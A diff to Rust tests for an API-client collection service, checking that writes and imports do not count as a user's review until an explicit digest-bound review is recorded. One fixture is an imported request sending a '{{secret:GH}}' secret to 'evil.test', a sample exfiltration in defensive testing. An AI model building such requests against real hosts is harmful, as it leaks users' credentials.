@@ -343,19 +343,30 @@ async fn review_is_tied_to_the_file_digest() {
     let pulled = secret.replace("TOKEN", "OTHER");
     std::fs::write(api.join("secret.json"), &pulled).expect("pull");
     assert!(!reviewed(&f.list(&root).await, "secret.json"));
-    // 화면 저장은 사용자가 본 내용이라 쓴 digest로 검토도 기록한다.
+    // 쓰기는 검토를 기록하지 않는다. 화면 저장은 사용자가 본 내용이라 쓴 digest로 검토를 따로 기록한다.
+    // (검토한 적 없는 새 내용으로 저장한다. 처음 내용은 위에서 검토한 digest라 그대로 검토된 것으로 보인다.)
+    let edited = secret.replace("TOKEN", "SAVED");
     let saved = f
         .write(
             &root,
             "secret.json",
-            secret,
+            &edited,
             CollectionExpect::Digest {
                 digest: sha(pulled.as_bytes()),
             },
         )
         .await
         .expect("save");
-    assert_eq!(saved.digest, sha(secret.as_bytes()));
+    assert_eq!(saved.digest, sha(edited.as_bytes()));
+    assert!(!reviewed(&f.list(&root).await, "secret.json"));
+    f.service
+        .review(ReviewFile {
+            root: root.clone(),
+            path: "secret.json".into(),
+            digest: saved.digest.clone(),
+        })
+        .await
+        .expect("review saved digest");
     assert!(reviewed(&f.list(&root).await, "secret.json"));
     // 개인 루트는 항상 검토된 것으로 본다.
     f.write(
@@ -367,6 +378,40 @@ async fn review_is_tied_to_the_file_digest() {
     .await
     .expect("personal");
     assert!(reviewed(&f.list(&CollectionRoot::Personal).await, "s.json"));
+}
+
+/// 가져오기처럼 사용자가 내용을 보지 않은 쓰기가 검토를 대신하지 않는다(07b 34행).
+/// 검토는 `api.collection_review`로 명시한 digest만 기록한다.
+#[tokio::test]
+async fn writing_a_project_file_does_not_record_a_review() {
+    let f = Fixture::new().await;
+    let (root, _) = f.project("app").await;
+    let request = "{\"version\":1,\"request\":{\"url\":\"https://evil.test/\",\"headers\":[{\"name\":\"X-Key\",\"value\":\"{{secret:GH}}\"}]}}";
+    let env = "{\"version\":1,\"name\":\"dev\",\"variables\":[{\"name\":\"x\",\"value\":\"{{secret:GH}}\"}]}";
+    for (path, text) in [("imported.request.json", request), ("env/dev.json", env)] {
+        let written = f
+            .write(&root, path, text, CollectionExpect::Absent)
+            .await
+            .expect("import write");
+        let read = f.read(&root, path).await.expect("read");
+        assert!(!read.reviewed, "{path}: a write must not count as review");
+        let listed = f.list(&root).await;
+        let item = listed
+            .items
+            .iter()
+            .find(|i| i.path == path)
+            .expect("listed");
+        assert!(!item.reviewed, "{path}: listed as unreviewed");
+        f.service
+            .review(ReviewFile {
+                root: root.clone(),
+                path: path.into(),
+                digest: written.digest.clone(),
+            })
+            .await
+            .expect("explicit review");
+        assert!(f.read(&root, path).await.expect("read").reviewed, "{path}");
+    }
 }
 
 #[tokio::test]
